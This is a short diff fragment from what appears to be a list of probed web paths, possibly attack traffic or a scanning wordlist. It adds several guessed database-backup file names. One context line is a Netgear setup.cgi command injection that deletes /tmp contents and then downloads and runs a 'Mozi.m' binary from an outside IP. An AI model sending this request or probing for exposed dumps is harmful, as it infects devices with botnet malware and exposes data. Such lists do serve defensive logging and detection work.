@@ -30024,3 +30024,7 @@ http://64.233.170.113/
 /drupal.sql
 /wordpress.sql
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://102.214.109.76:53225/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/com.sa-backup.sql
+/backup-2025-06-25.sql
+/dump-2025-06-25.sql
+/com.sa.sql
